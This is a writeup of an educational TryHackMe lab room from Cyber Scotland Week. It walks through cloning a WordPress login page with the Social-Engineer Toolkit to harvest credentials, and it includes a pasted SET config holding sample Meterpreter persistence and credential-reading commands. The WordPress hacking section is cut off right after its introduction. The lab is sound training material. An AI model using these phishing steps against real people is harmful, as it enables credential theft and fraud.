# Cyber Scotland 2021 — Writeup

## Overview
### Cyber Scotland 2021 — Writeup
### Cyber Scotland 2021 — Writeup
----
Follow along tutorials for Scottish Cyberweek Demos
---
### ![](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/733a17f9c909.png) **Cyber Scotland Week**
![](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/cyberweek-logo.gif)
Welcome to the SBRC Cyber Scotland Week TryHackMe Challenge!
If you've ever wondered how a hacker actually hacks things then you've come to the right place. Using this website you will be able to access a virtual computer and complete 2 hacking challenges where you'll get to employ the tools and techniques used by real hackers to attack real websites. That's right - you'll be hacking for real and hopefully will get a feel for just how easy it is to take advantage of poor cybersecurity practices.
It goes without saying that nothing you learn here should **ever** be used in real life against a target which you do not have permission to attack.
For the purposes of this exercise we have set up an fake website for you to hack. In order to get everything running properly you will need to carefully follow the steps outlined in Task 2. After that you are free to tackle Tasks 3 and 4 in any order you like!
Answer the questions below
Let's get started!
Completed
### ![](https://assets.tryhackme.com/img/logo/tryhackme_logo.png) **Using TryHackMe**
Start Machine
**TryHackMe**
TryHackMe is a cybersecurity training company which allows you to deploy vulnerable machines in the cloud. There are a huge range of "rooms" (pages on the site which contain teaching content and/or a challenge) [already on the site](https://tryhackme.com/hacktivities); however, it is also possible to create private content for a specific use, which is what we've built for you here!
﻿**Deployable Machines**
One of the biggest strengths of TryHackMe is the ability to upload and deploy vulnerable machines in the cloud. Notice the green "Deploy" button at the top of this task:
![Image depicting the deploy button](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/baa381ba2301.png)
When this is clicked, it starts up your very own copy of the vulnerable machine attached to the task -- this will take just a short time to start up fully (allow up to five minutes). A box will appear at the top of the page giving you details about this machine:
![Machine details are shown at the top of the page](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/4454a44acf00.png)
This target is unique to you (it will have a different IP address), and will expire after an hour -- or two, if you hold a subscription to the site. Make sure to click the "Add 1 hour" button if the timer gets close to zero!
We will be using the machine attached to this task throughout the rest of this room, so press the "Deploy" button now.
**The AttackBox**
TryHackMe provides an in-browser machine which can be used by people who don't have a dedicated hacking setup. To activate this, click the "Start AttackBox" button at the top of the screen:
![AttackBox button](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/1bb092e80102.png)
This will split your browser window in half. On the left you will be able to see the room. On the right you will have a connection into a hacking environment which you can use to follow through the content on this page. Once again this will take a minute or two to initialise:
![AttackBox Window](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/ceeaf7c4c3b9.png)
Users without a subscription to the site only get access to this once for an hour a day, so use your time wisely!
Due to how the AttackBox is accessed in the web browser, if you are copying and pasting things to and from the AttackBox then you need to use the _shared clipboard_. This is accessed using the arrow at the left of the attackbox window:
![](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/f9c7375a7ddb.png)
You can then click the clipboard icon to access the shared clipboard:
![](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/5d04a5e3e824.png)
Anything that gets pasted into this box appears in the AttackBox clipboard and can then be pasted into the AttackBox using Ctrl + Shift + V if you're using the terminal, or Ctrl + V elsewhere.
Similarly, anything in the AttackBox clipboard (like a flag, for example), will appear in this window for you to copy out into the clipboard.
If you already have a local hacking environment available (e.g. a Kali virtual machine), you can connect to the TryHackMe network using an [OpenVPN Connection pack](https://tryhackme.com/access).
**This Room**
The machine that you deployed will be used in both of the tasks in this room. First we will look at setting up phishing attacks, then we will hack Wordpress -- the content management system that props up over a third of the internet[[1]](https://w3techs.com/technologies/details/cm-wordpress).
Before we can do that though, we need to configure the AttackBox to allow us to access the target website. The inner workings of this don't matter hugely -- all you need to do is follow the instructions below.
1.  Wait until the AttackBox has fully loaded and there is an IP in the box at the top of the screen. Once these are both loaded, open a terminal in the AttackBox by clicking on the terminal Icon at the top of the screen:
![AttackBox Terminal button](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/76ab9f351abf.png)
2.  A terminal will then open. Type the following command into the command line and press enter:`echo "MACHINE_IP repairshop.sbrc" >> /etc/hosts`_**
Note:** Only execute this command if it contains an IP address_ _(four numbers separated by dots). If "MACHINE_IP" is present in the command then this indicates that the target box has not fully loaded yet.
_
3.  Next, type this command and press enter:
`echo "127.0.0.1 fonts.googleapis.com" >> /etc/hosts`
Your terminal should now look something like this (with a different IP address in the first command):
![Terminal Inputs](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/38120de167e3.png)
The AttackBox should now be set up to access the target!
---
[1] [https://w3techs.com/technologies/details/cm-wordpress](https://w3techs.com/technologies/details/cm-wordpress)
Answer the questions below
Make sure that you have deployed both the machine attached to this task _and_ the AttackBox.
Completed
Follow the instructions above to configure the AttackBox to access the target.
Completed
```text
root@ip-10-10-245-241:~# echo "10.10.178.103 repairshop.sbrc" >> /etc/hosts
root@ip-10-10-245-241:~# echo "127.0.0.1 fonts.googleapis.com" >> /etc/hosts
root@ip-10-10-245-241:~# tail /etc/hosts
127.0.0.1	localhost
127.0.1.1	tryhackme.lan	tryhackme
```
```text
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.178.103 repairshop.sbrc
127.0.0.1 fonts.googleapis.com
```
### ![](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/set.png) **Social Engineering Toolkit**
Now that you understand the basics of TryHackMe it's time for us to do some hacking of our own. This task will demonstrate how attackers can impersonate legitimate services in order to steal customers' personal information.  Often hackers will create fake emails pretending to be a bank or online retailer asking users to click on a link and log into their account. The link will lead to a website that looks just like the genuine one but it's actually a fake, owned by the hacker and used to simply trick the victim into giving up their user credentials.
In this task we'll show you how easy it is to clone a website and create your own spoofed version using a tool called the Social Engineering Toolkit.
![](https://imgur.com/ItbicB0.png)
<blockquote class="imgur-embed-pub" lang="en" data-id="ItbicB0"><a href="https://imgur.com/ItbicB0">View post on imgur.com</a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
This is a text-based application that can be used to launch a variety of cyberattacks, from the aforementioned website spoofing, Wifi attacks, spear phishing and quite a lot more besides. Understanding how cyberattacks are mounted can make them a lot easier to spot before you fall for them and we hope that the following exercises will give a glimpse of cybersecurity from a hacker's perspective.
Make sure that you have run through all the steps in Task 2 before proceeding.
Answer the questions below
First of all open up a **Terminal** window by either double-clicking on the Terminal icon on the desktop or single clicking the icon on the top menu bar.
![](https://imgur.com/jFE3wNy.png)
https://imgur.com/jFE3wNy
Terminal is a powerful tool that you can use to give instructions to the AttackBox computer and can be used to run applications. To find out the name of the account you're using type `whoami` into the terminal and press the ENTER key on your keyboard. Write out the response in the answer field below.
*root*
If you like you can experiment with the terminal for a while by trying out some of the commands from this [howtogeek article](https://www.howtogeek.com/140679/beginner-geek-how-to-start-using-the-linux-terminal/). Once you're ready move on to the next step where we'll look at cloning a website.
Completed
Let's check out the website that we're going to be cloning. Type `firefox` into the Terminal window and press the ENTER key. After a few seconds a Firefox web browser should launch. If you're not familiar with Firefox don't worry! It's just another web browser like Google Chrome or Microsoft Edge or Safari etc. We can use it to browse the internet.
First of all we need to choose a website to clone, for this demonstration we'll use a specially created demonstration site but the Social Engineering Toolkit can be used for virtually any website. Navigate to`http://repairshop.sbrc` to see the website that we'll be attacking.
![](https://imgur.com/PW2DdEB.png)
Completed
Now we need to launch the Social Engineering Toolkit. Close the Firefox browser and go back to the Terminal window. For this to work you will need to copy and paste the following command into the Terminal window:
`sed -i 's/WEB_PORT=80/WEB_PORT=100/g' /etc/setoolkit/set.config   `
![](https://imgur.com/tqlsgbh.png)
Once you've done that we can launch the Social Engineering Toolkit. In the Terminal window type `setoolkit` and press the ENTER key.
The application will take a few seconds to load and you will see this text with a number of options.
![](https://imgur.com/t411qFG.png)
https://imgur.com/t411qFG
You can select an option by typing in the number next to it and hitting the ENTER key. So for instance if we wanted to conduct a 'Social-Engineering Attack' (where we create a spoof email in order to impersonate someone else) we would type '1' into the Terminal and hit ENTER.
If you like, you can take a moment to navigate through some of the options. You can always return to the main menu by typing '99' and hitting the ENTER key. If you accidentally exit out of the Social Engineering Toolkit application just type `setoolkit` back into Terminal to relaunch it.
Question; What is the first option under the 'Penetration Testing (Fast Track)' menu?
*Microsoft SQL Bruter*
We're now ready to clone a website. Navigate back to the main menu by typing  in '99'. The main menu looks like this:
![](https://imgur.com/t411qFG.png)
We want to mount a Social Engineering attack so select option 1.
![](https://imgur.com/H0bwJh6.png)
The next menu will show a number of different kinds of attack that you may wish to look at later. For now though select option 2 as we'll be attacking a website.
![](https://imgur.com/2UXEZ9B.png)
For this particular attack we just want to steal the usernames and passwords (credentials) of unsuspecting victims so select option 3 on this menu.
![](https://imgur.com/ZV3kQND.png)
The Social Engineering Toolkit actually comes preloaded with a number of fake pages for things like Google, Facebook and Twitter etc. You can use one of these by choosing the first option. We're going to use option 2 though as it allows us to clone a site of our choosing.
![](https://imgur.com/BVvbtg5.png)
Now we have to enter the IP address of the server that we'll be hosting our cloned website on. To keep things simple we're just going to host it locally. Type `127.0.0.1` when prompted.
![](https://i.imgur.com/z6LdRud.png)
Almost there! Now comes the interesting part - we need to choose a website to clone. Most wordpress sites like repairshop.sbrc have an adminstrator login page. You can find the repairshop one in Firefox by going to `http://repairshop.sbrc/wp-login.php`
![](https://imgur.com/iu8qle5.png)
Jump back to the Terminal and type `http://repairshop.sbrc/wp-login.php`  when asked what URL you would like to clone.
![](https://imgur.com/TR7dkdK.png)
Completed
The final thing we need to do is check if we've successfully cloned the website. Launch Firefox and in the URL bar type `127.0.0.1:100` We should see a login page that's identical to the real thing - with one important caveat: We now get to see whatever credentials are typed in.
Try it out! Type in a random username and password and click the 'Log In' button.
![](https://imgur.com/uYMbkOU.png)
Now hop back over to the Terminal window with the Social Engineering Toolkit running. We should see the credentials we've just entered.
![](https://imgur.com/9ouhU0t.png)
If you jump back over to Firefox you'll notice that the webpage has reloaded, but now it's back to the real repairshop.sbrc page. This is particularly useful as an unsuspecting victim will just assume they typed in their credentials incorrectly and hopefully won't realise that they initially typed their password into a spoofed site.
So what did we just do?
Completed
To summerize we cloned someone else's website and hosted it on our own server. A real attacker would then need to trick someone into visiting their cloned website instead of the real one. This would normally be achieved with a phishing email. You may have noticed that the Social Engineering toolkit actually provides this functionality as well.
![](https://imgur.com/vf2EBH1.png)
We could very easily create an email using the repairshop logo; sending it out to their customers with a disguised link that will take them back to our websites. Hiding links is easy - think that this will take you to the bbc? [www.bbc.co.uk](http://www.sbrcentre.co.uk/) Click it and find out!
So how can we protect ourselves? Well the obvious clue with our cloned website was the URL - we had to navigate to http://127.0.01. This is the achilles heel of all spoofed sites, although it's not always so obvious. Hackers will use URLs that are visually similar to the real thing in order to fool victims. For instance if they wanted to clone the login page for 'google.com' they might register a site called 'göögle.com' in order to fool a visitor. There's a number of tricks that can be used, like using zeros in place of 'O's (g00le.com vs google.com) and so on. Hacker's don't just use emails either. Here's an example of the same thing using a text message, where the attacker was pretending to be the Royal Mail:
![](https://imgur.com/WmVHJR2.png)
In this case the attacker was using the uppercase 'I' instaed of a lowercase 'l' in 'royaImaiI'.
The only surefire way to make sure the website that we've been linked to is safe is to inspect the URL carefully, which can be difficult. A better idea is not to rely on links that have been sent to you but instead navigate to the site independently. So if you get an email from a service provider saying to login, access the site through a google search instead.
Completed
```text
root@ip-10-10-245-241:~# whoami
root
root@ip-10-10-245-241:~# cat /etc/setoolkit/set.config
##################################################################################################
##################################################################################################
##                                                                                              ##
## The following config file will allow you to customize settings within                        ##
## the Social-Engineer Toolkit. The lines that do not have comment code		            ##
## ("#") are the fields you want to toy with. They are pretty easy to		                ##
## understand.									                                        ##
##										                                                        ##
## The Metasploit path is the default path for where Metasploit is located.	            ##
## Metasploit is required for SET to function properly.				                        ##
##									                                                            ##
## The "ETTERCAP" option specifies if you want to use ARP cache poisoning in	            ##
## conjunction with the web attacks; note that ARP cache poisoning is only	                    ##
## for internal subnets only and does not work against people on the Internet.	                ##
##								                                                                ##
## The "SENDMAIL" option allows you to spoof source IP addresses utilizing an                   ##
## program called Sendmail. Sendmail is not installed by default on Kali.	                ##
## To spoof email addresses when performing the mass email attacks, you must                    ## 
## install Sendmail manually using the command: "apt-get install sendmail"	                    ##
#							                                                                    ##
## Note that "ETTERCAP" and "SENDMAIL" options only accept ON or OFF switches.	                ##
##										                                                        ##
## Note that the "Metasploit_PATH" option cannot have a '/' after the folder name.		        ##
##							                                                                    ##
## There are additional options; read the comments for additional descriptions.            ##
##										                                                ##
## CONFIG_VERSION=7.7.9								                                    ##
##								                                                                ##
##################################################################################################
##################################################################################################
#
### Define the path to Metasploit. For example: /opt/metasploit/apps/pro/msf3
METASPLOIT_PATH=/opt/metasploit-framework-5101/
#
### This will tell what database to use when using Metasploit. The default is PostgreSQL.
METASPLOIT_DATABASE=postgresql
#
### Define how many times SET should encode a payload if you are using standard Metasploit encoding options.
ENCOUNT=4
#
### If this option is set, the Metasploit payloads will automatically migrate to
### Notepad once the applet is executed. This is beneficial if the victim closes
### the browser; however, this can introduce buggy results when auto migrating.
### Note that this will make bypassuac not work properly. Migrate to a different process to get it to work.
AUTO_MIGRATE=OFF
#
### Here, we can run multiple Meterpreter scripts once a session is active. This
### may be important if we are sleeping and need to run persistence, elevate
### permissions, or complete other tasks in an automated fashion. First, turn this trigger on, and
### then configure the options. Note that you need to separate the commands by a ';'.
METERPRETER_MULTI_SCRIPT=OFF
LINUX_METERPRETER_MULTI_SCRIPT=OFF
#
### Determine what commands you want to run once a Meterpreter session has been established.
### If you want multiple commands, separate them by a ';'. For example you could do
### "run getsystem;run hashdump;run persistence" to run three different commands.
METERPRETER_MULTI_COMMANDS=run persistence -r 192.168.1.5 -p 21 -i 300 -X -A;getsystem
LINUX_METERPRETER_MULTI_COMMANDS=uname;id;cat ~/.ssh/known_hosts
#
### This is the port that is used for iFrame injection when using the Metasploit browser attacks.
### By default, this port is 8080; however, egress filtering may block this. You may want to adjust to
### something like 21 or 53.
METASPLOIT_IFRAME_PORT=8080
#
### Define whether or not to use Ettercap for the website attack.
ETTERCAP=OFF
#
### Ettercap home directory (needed for DNS_spoof).
ETTERCAP_PATH=/usr/share/ettercap
#
### Specify what interface you want Ettercap or dsniff to listen on.
ETTERCAP_INTERFACE=eth0
#
### Define whether or not to use dsniff for the website attack.
### If dsniff is set to on, Ettercap will be automatically disabled.
DSNIFF=OFF
#
### Autodetection of IP address interface utilizing Google.
AUTO_DETECT=OFF
#
### Define whether or not to use Sendmail for spoofing emails. 
SENDMAIL=OFF
#
### The email providers supported are Gmail, Hotmail, and Yahoo.
EMAIL_PROVIDER=GMAIL
#
### Turn on if you want to use email in conjunction with the web attack. 
WEBATTACK_EMAIL=OFF
#
### Web attack time delay between emails. The default is one second.
TIME_DELAY_EMAIL=1
#
### Use Apache instead of the standard Python web server. This will increase the speed
### of the attack vector.
APACHE_SERVER=OFF
#
### Path to the Apache web root.
APACHE_DIRECTORY=/var/www/html
#
### Specify what port to run the HTTP server on that serves the Java applet attack
### or Metasploit exploit. The default is port 80. If you are using Apache, you
### need to specify what port Apache is listening on in order for this to work properly.
WEB_PORT=80

root@ip-10-10-245-241:~# cd /etc/setoolkit
root@ip-10-10-245-241:/etc/setoolkit# ls
__pycache__  set.config  set_config.py
root@ip-10-10-245-241:/etc/setoolkit# sed -i 's/WEB_PORT=80/WEB_PORT=100/g' /etc/setoolkit/set.config
root@ip-10-10-245-241:/etc/setoolkit# setoolkit
[-] New set.config.py file generated on: .084639
[-] Verifying configuration update...
[*] Update verified, config timestamp is: .084639
[*] SET is using the new config, no need to restart

           ..######..########.########
           .##....##.##..........##...
           .##.......##..........##...
           ..######..######......##...
           .......##.##..........##...
           .##....##.##..........##...
           ..######..########....##...  

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!

 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set> 2

The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.

The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.

The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.

The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

-------------------------------------------------------------------------------
--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

The way that this works is by cloning a site and looking for form fields to
rewrite. If the POST fields are not usual methods for posting forms this 
could fail. If it does, you can always save the HTML, rewrite the forms to
be standard forms and use the "IMPORT" feature. Additionally, really 
important:

If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
IP address below, not your NAT address. Additionally, if you don't know
basic networking concepts, and you have a private IP address, you will
need to do port forwarding to your NAT IP address from your external IP
address. A browser doesns't know how to communicate with a private IP
address, so if you don't specify an external IP address if you are using
this from an external perpective, it will not work. This isn't a SET issue
this is how networking works.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.10.245.241]:127.0.0.1
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:http://repairshop.sbrc/wp-login.php

go to 12.0.0.1:100

[*] Cloning the website: http://repairshop.sbrc/wp-login.php
[*] This could take a little bit...

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 100
[*] Information will be displayed to you as it arrives below:
127.0.0.1 - - [16/Feb/2023 04:49:42] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [16/Feb/2023 04:49:43] "GET /favicon.ico HTTP/1.1" 404 -
[*] WE GOT A HIT! Printing the output:
PARAM: log=witty
POSSIBLE PASSWORD FIELD FOUND: pwd=witty1
PARAM: wp-submit=Log+In
PARAM: redirect_to=http://repairshop.sbrc/wp-admin/
PARAM: testcookie=1
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

127.0.0.1 - - [16/Feb/2023 04:49:49] "POST /index.html HTTP/1.1" 302 -
```
### ![](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/wp-logo.png) **Wordpress Hacking**
Wordpress is an easy-to-use Content Management System (CMS) which has been used to build a vast number of websites world-wide. Unfortunately, it can be relatively easy to hack if out of date or configured incorrectly.
There are three main things which can lead to the compromise of a Wordpress site:
-   **Human Error:** There is a common saying in hacker circles:- "The weakest link is the human link". This is very often the case. For example, if a site administrator happens to have a weak password then the site can easily be compromised. This includes things which adhere to password requirements but are easy to guess, such as their child's name followed by date of birth; despite the password being technically difficult to crack, the personally identifiable information makes it easy to generate a custom password list to attack the site with.
Equally, humans are often vulnerable to social engineering attacks. A charismatic hacker phoning around may be able to obtain credentials to access a site without undue difficulty if staff are not aware of the dangers.
-   **Vulnerabilities in Wordpress:** Vulnerabilities in the Wordpress core software are rare, but are often very dangerous. If the site has not been updated in a while then the chance of finding a vulnerability in the core software are high.
-   **Wordpress Plugins:** One of the things that makes Wordpress so easy to work with is the plugin-based system employed by the software. Plugins can be used to add a lot of functionality to the Wordpress core -- everything from email forms, to online shops, to simple photo galleries. The problem with plugins is that they greatly increase the attack surface available to an attacker. The Wordpress core software is very well-known, and thus is frequently targetted by ethical bug bounty hunters; meaning that vulnerabilities are quickly found and patched. Plugins, on the other hand, are usually not nearly as well audited -- especially are there are millions of them available. As such, it's common to find vulnerabilities in (especially less common) plugins; some of which can be very serious indeed.
As with the Wordpress core software, outdated plugins are much more likely to be vulnerable.
Ultimately, an attacker usually only needs one thing to be wrong for them to get their hook into the site. An attacker with administrative access to a Wordpress website can cause chaos. As a worst case scenario they can use the access to gain access to the server (and anything else hosted on it); this is usually a very easy task with the default configuration of Wordpress as the system's features lend themselves well to executing arbitrary code. An attacker could also use their access to deface the site, host malicious files on the server, or perform a wide range of other less than savoury actions -- limited only by their imagination.
So, how can you protect against these attacks?
-   Make sure that all passwords are randomly generated and stored in a password manager, or carefully chosen pass phrases. A good way to choose passwords is by taking an old copy of a book, choosing a random sentence, and marking it (e.g. with a highlighter). This sentence then serves as a passphrase which will be nearly impossible to crack.
-   Keep your Wordpress installation (and all themes/plugins) up to date. Don't miss any patches!
-   Check any plugins you install for vulnerabilities using a site such as [Exploit-DB](https://exploit-db.com/) before installing them. Also think twice before installing lesser-known plugins which don't have many installations.
-   Protect your site with software such as a fail2ban which will detect bruteforce attempts and block the IP address of the attacker. This will not stop a skilled hacker, but it does make life more difficult for them.
---
With the theory out of the way, it's time to hack a site!
Answer the questions below
Open up the web browser _in your AttackBox_ and navigate to:
